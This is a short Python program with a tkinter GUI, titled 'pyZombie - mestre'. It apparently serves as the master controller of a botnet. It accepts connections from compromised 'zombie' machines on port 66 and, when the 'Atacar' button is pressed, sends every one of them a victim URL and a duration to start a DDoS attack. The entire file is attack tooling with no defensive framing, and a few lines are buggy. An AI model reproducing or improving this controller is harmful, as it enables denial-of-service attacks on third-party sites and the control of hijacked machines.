import tkinter,socket, threading
class Aplicacao:
	def __init__(self, master=None):
		threading.Thread(target=self.inicia_socket).start()
		self.label= tkinter.Label(root,text='Vitima')
		self.label.place(x=5, y=5)
		self.vitima=tkinter.Entry(root,width='20')
		self.vitima.insert(0,'http://')
		self.vitima.place(x=5,y=25)
		self.label=tkinter.Label(root,text='Tempo')
		self.label.place(x=80,y=50)
		self.tempo=tkinter.Entry(root, width='5')
		self.tempo.insert(0,'60')
		self.tempo.place(x=125,y=50)
		self.BotaoAtacar=tkinter.Button(root,text='Atacar',font=('Times New Roman',20), command=self.atacar)
		self.BotaoAtacar.place(x=180,y=10, width=100, height=70)
	def atacar(self):
		for sock in vitimas:
			dados=self.vitima.get() + '|' + self.tempo.get()
			try:
				sock.send(dados)
			except socket.error:
				sock.close()
				del vitimas[vitimas.index(sock)]
		print('INFO : ', 'DDoS Iniciado')
	def inicia_socket(self):
		n=0
		sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(('0.0.0.0',66))
		sock.listen(1)
		while True:
			client_socket, client_addr = sock.accept()
			vitimas.append(client_socket)
			print(client_addr[0], "conectado a rede zombiee")
			n=n+1
			label=tkinter.Label(root,text=n, fg='red')
			label.place(x=5,y=65)
root=tkinter.Tk()
root.geometry('290x90')
root.resizable('False', 'False')
root.title('pyZombie - mestre')
vitimas=[]
Aplicacao(root)
root.mainloop()
Aplicacao()
